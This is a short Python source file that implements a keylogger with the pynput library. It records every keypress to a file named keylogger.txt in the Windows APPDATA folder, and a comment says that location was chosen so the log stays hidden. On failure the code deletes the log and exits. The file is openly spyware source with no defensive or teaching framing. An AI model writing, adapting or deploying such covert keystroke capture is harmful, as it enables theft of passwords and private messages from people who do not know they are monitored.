from pynput import keyboard
import os
def on_press(key):
    try:
        log_file = os.path.join(os.getenv("APPDATA"), "keylogger.txt") # generating the log of keys in the appdata folder so that it is hidden
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError: # if the key is not a character (like shift, ctrl, etc.), we log it differently
        log_file = os.path.join(os.getenv("APPDATA"), "keylogger.txt")
        with open(log_file, "a") as f:
            f.write(f"{key}")
def starter():
    try:
        listen=keyboard.Listener(on_press=on_press) # using the listen function from the pynput's keyboard library to listen to the key presses
        listen.start()
    except Exception as e:
        os.remove(os.path.join(os.getenv("APPDATA"), "keylogger.txt"))
        os._exit(1)
        